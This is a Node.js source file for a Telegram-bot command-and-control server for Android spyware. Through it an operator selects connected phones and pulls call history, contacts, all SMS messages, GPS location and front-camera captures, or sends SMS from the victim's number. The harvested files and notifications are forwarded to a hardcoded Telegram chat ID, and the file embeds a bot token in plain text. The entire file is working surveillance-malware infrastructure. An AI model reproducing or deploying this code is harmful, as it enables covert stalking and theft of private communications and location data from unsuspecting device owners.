const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// --- Setup Multer ---
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => cb(null, file.originalname)
});
const upload = multer({ storage });

// --- Multi-Device State ---
// devices[deviceId] = { name, lastSeen, pendingCommand, requestingChatId }
const devices = {};

// Per-user: which device they have currently selected
// userSession[chatId] = deviceId
const userSession = {};

// Per-device extra command data (e.g. sms target/body)
// deviceExtras[deviceId] = { smsTo, smsBody }
const deviceExtras = {};

const ONLINE_TIMEOUT_MS = 60 * 1000; // 60 seconds — device considered online

function getOnlineDevices() {
    const now = Date.now();
    return Object.entries(devices).filter(([, d]) => (now - d.lastSeen) < ONLINE_TIMEOUT_MS);
}

// --- Telegram Bot ---
const BOT_TOKEN = '8710683386:AAFwZ_aRbFNVBVBO0HRGW6S_LBTCgYIiYZc';
const bot = new Telegraf(BOT_TOKEN);

// Helper: send device list menu
function sendDeviceMenu(ctx) {
    const online = getOnlineDevices();
    if (online.length === 0) {
        return ctx.reply(
            '📵 *No devices connected.*\n\nMake sure the app is installed and running on your device.',
            { parse_mode: 'Markdown' }
        );
    }

    const buttons = online.map(([id, d]) =>
        [Markup.button.callback(`📱 ${d.name}`, `select_device_${id}`)]
    );
    buttons.push([Markup.button.callback('🔄 Refresh', 'refresh_devices')]);

    return ctx.reply(
        `🛰️ *Connected Devices* — ${online.length} online\n\nSelect a device to control:`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }
    );
}

// Helper: send command menu for a device
function sendCommandMenu(ctx, deviceId, deviceName) {
    return ctx.editMessageText(
        `📱 *${deviceName}*\n\nChoose a command to run on this device:`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [
                    Markup.button.callback('📞 Call History', `cmd_ch_${deviceId}`),
                    Markup.button.callback('👥 Contacts',    `cmd_contact_${deviceId}`)
                ],
                [
                    Markup.button.callback('💬 All SMS',     `cmd_as_${deviceId}`),
                    Markup.button.callback('📍 Location',    `cmd_loc_${deviceId}`)
                ],
                [
                    Markup.button.callback('📸 Front Camera', `cmd_cf_${deviceId}`)
                ],
                [Markup.button.callback('« Back to Devices', 'back_to_devices')]
            ])
        }
    );
}

// /start — show device menu
bot.start((ctx) => sendDeviceMenu(ctx));

// /devices — show device menu
bot.command('devices', (ctx) => sendDeviceMenu(ctx));

// --- Inline Keyboard Callbacks ---

// Refresh device list
bot.action('refresh_devices', async (ctx) => {
    await ctx.answerCbQuery('🔄 Refreshing...');
    return sendDeviceMenu(ctx);
});

// Back to device list
bot.action('back_to_devices', async (ctx) => {
    await ctx.answerCbQuery();
    return sendDeviceMenu(ctx);
});

// Select a device
bot.action(/^select_device_(.+)$/, async (ctx) => {
    const deviceId = ctx.match[1];
    const device = devices[deviceId];
    if (!device) {
        await ctx.answerCbQuery('⚠️ Device no longer online!');
        return sendDeviceMenu(ctx);
    }
    userSession[ctx.chat.id] = deviceId;
    await ctx.answerCbQuery(`Selected: ${device.name}`);
    return sendCommandMenu(ctx, deviceId, device.name);
});

// Run a command on the selected device
bot.action(/^cmd_(\w+)_(.+)$/, async (ctx) => {
    const command = ctx.match[1];
    const deviceId = ctx.match[2];
    const device = devices[deviceId];
    if (!device) {
        await ctx.answerCbQuery('⚠️ Device went offline!');
        return sendDeviceMenu(ctx);
    }

    const commandLabels = {
        ch:      '📞 Call History',
        contact: '👥 Contacts',
        as:      '💬 All SMS',
        loc:     '📍 Location',
        cf:      '📸 Front Camera',
        ms:      '📤 Send SMS'
    };

    device.pendingCommand = command;
    device.requestingChatId = ctx.chat.id;

    await ctx.answerCbQuery('✅ Command sent!');
    await ctx.editMessageText(
        `⏳ *${commandLabels[command] || command}* command sent to *${device.name}*.\n\nWaiting for the device to respond…`,
        { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back', `select_device_${deviceId}`)]]) }
    );
});

// "Send SMS" button — prompt user to type /ms command
bot.action(/^cmd_smsmode_(.+)$/, async (ctx) => {
    const deviceId = ctx.match[1];
    const device = devices[deviceId];
    if (!device) { await ctx.answerCbQuery('Device offline!'); return; }
    userSession[ctx.chat.id] = deviceId;
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        `📤 *Send SMS from ${device.name}*\n\nType the command below:\n\`/ms +91XXXXXXXXXX Your message here\`\n\nExample:\n\`/ms +919876543210 Hello World!\``,
        { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back', `select_device_${deviceId}`)]]) }
    );
});

// /ms <number> <message> — send SMS from the selected device
bot.command('ms', async (ctx) => {
    const chatId = ctx.chat.id;
    const deviceId = userSession[chatId];
    if (!deviceId || !devices[deviceId]) {
        return ctx.reply('⚠️ No device selected.\nUse /devices first to pick a device.');
    }
    const raw = ctx.message.text.replace('/ms', '').trim();
    const spaceIdx = raw.indexOf(' ');
    if (spaceIdx === -1 || !raw) {
        return ctx.reply('❌ Usage: `/ms <phone_number> <message>`\n\nExample:\n`/ms +919876543210 Hello!`', { parse_mode: 'Markdown' });
    }
    const smsTo = raw.substring(0, spaceIdx).trim();
    const smsBody = raw.substring(spaceIdx + 1).trim();
    if (!smsTo || !smsBody) return ctx.reply('❌ Both phone number and message are required.');

    const device = devices[deviceId];
    device.pendingCommand = 'ms';
    device.requestingChatId = chatId;
    deviceExtras[deviceId] = { smsTo, smsBody };

    ctx.reply(`📤 *SMS queued for ${device.name}*\n\n📞 To: \`${smsTo}\`\n💬 Message: ${smsBody}\n\n_Will be sent within ~10 seconds._`, { parse_mode: 'Markdown' });
});

// Launch bot
bot.launch().then(() => console.log('✅ Telegraf Bot launched!'));
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

// --- Express API Endpoints ---

// 1. Android polls this endpoint to register and get its pending command
app.get('/check-command', (req, res) => {
    const { deviceId, deviceName } = req.query;
    if (!deviceId) return res.status(400).json({ command: 'none' });

    // Register / update device heartbeat
    if (!devices[deviceId]) {
        devices[deviceId] = { name: deviceName || deviceId, lastSeen: Date.now(), pendingCommand: 'none', requestingChatId: null };
    } else {
        devices[deviceId].lastSeen = Date.now();
        if (deviceName) devices[deviceId].name = decodeURIComponent(deviceName);
    }

    const device = devices[deviceId];
    if (device.pendingCommand && device.pendingCommand !== 'none') {
        const cmd = device.pendingCommand;
        device.pendingCommand = 'none';
        // For ms command, attach extra params
        if (cmd === 'ms' && deviceExtras[deviceId]) {
            const extra = deviceExtras[deviceId];
            delete deviceExtras[deviceId];
            return res.json({ command: cmd, smsTo: extra.smsTo, smsBody: extra.smsBody });
        }
        return res.json({ command: cmd });
    }

    return res.json({ command: 'none' });
});

// 2. Android uploads a file (call log, contacts, SMS)
app.post('/upload-log', upload.single('document'), async (req, res) => {
    if (!req.file) return res.status(400).send('No file uploaded.');

    const deviceId = req.body.deviceId;
    const device = devices[deviceId];
    const chatId = device?.requestingChatId || '1691680798';
    if (device) device.requestingChatId = null;

    try {
        await bot.telegram.sendDocument(chatId, {
            source: req.file.path,
            filename: req.file.originalname
        }, {
            caption: device ? `📱 From: *${device.name}*` : undefined,
            parse_mode: 'Markdown'
        });
        res.status(200).send('Forwarded.');
    } catch (e) {
        console.error('Upload error:', e);
        res.status(500).send('Error forwarding.');
    } finally {
        fs.unlink(req.file.path, () => {});
    }
});

// 3. Android uploads GPS location
app.post('/upload-location', async (req, res) => {
    const { latitude, longitude, deviceId } = req.body;
    if (!latitude || !longitude) return res.status(400).send('Missing coords.');

    const device = devices[deviceId];
    const chatId = device?.requestingChatId || '1691680798';
    if (device) device.requestingChatId = null;

    const mapsLink = `📍 *Location* ${device ? `from *${device.name}*` : ''}\nhttps://www.google.com/maps?q=${latitude},${longitude}`;

    try {
        await bot.telegram.sendMessage(chatId, mapsLink, { parse_mode: 'Markdown' });
        res.status(200).send('Location forwarded.');
    } catch (e) {
        res.status(500).send('Error.');
    }
});

// Health check
app.get('/', (req, res) => res.send('✅ Multi-device bot server running.'));

// 4. Android sends real-time notifications & SMS alerts through here
app.post('/send-notification', async (req, res) => {
    const { deviceId, text } = req.body;
    if (!text) return res.status(400).send('Missing text.');

    const device = devices[deviceId];
    const deviceLabel = device ? `📱 *${device.name}*` : '📱 *Unknown Device*';
    const fullText = `${deviceLabel}\n${text}`;

    const CHAT_ID = '1691680798';
    try {
        await bot.telegram.sendMessage(CHAT_ID, fullText, { parse_mode: 'Markdown' });
        res.status(200).send('Sent.');
    } catch (e) {
        console.error('Notification forward error:', e.message);
        res.status(500).send('Error.');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server listening on port ${PORT}`));
